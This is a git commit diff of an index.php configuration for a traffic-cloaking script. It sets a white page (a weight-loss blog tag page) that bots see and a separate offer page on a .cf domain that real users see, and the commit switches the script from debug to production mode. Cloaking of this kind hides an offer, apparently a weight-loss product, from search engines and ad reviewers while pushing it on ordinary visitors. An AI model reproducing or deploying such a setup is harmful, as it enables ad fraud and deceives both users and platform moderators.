abd9637afd95d011debd676bd70bcaecba001c31
mkt2rafael <101737854+mkt2rafael@users.noreply.github.com>
2022-03-18 10:26:07 -0300

    Update index.php

--- index.php
+++ index.php
@@ -2,7 +2,7 @@
 /* Required settings     */
 $CLOAKING['WHITE_PAGE'] = 'https://blogdamimis.com.br/tag/emagrecer/';//PHP/HTML file or URL used for bots
 $CLOAKING['OFFER_PAGE'] = 'https://protocolozb.cf/';//PHP/HTML file or URL offer used for real users
-$CLOAKING['DEBUG_MODE'] = 'on';// replace "on" with "off" to switch from debug to production mode
+$CLOAKING['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
 $CLOAKING['STEALTH'] = 'off';// replace "on" with "off" to hide stat page
 /*********************************************/
 /* Available additional settings  */
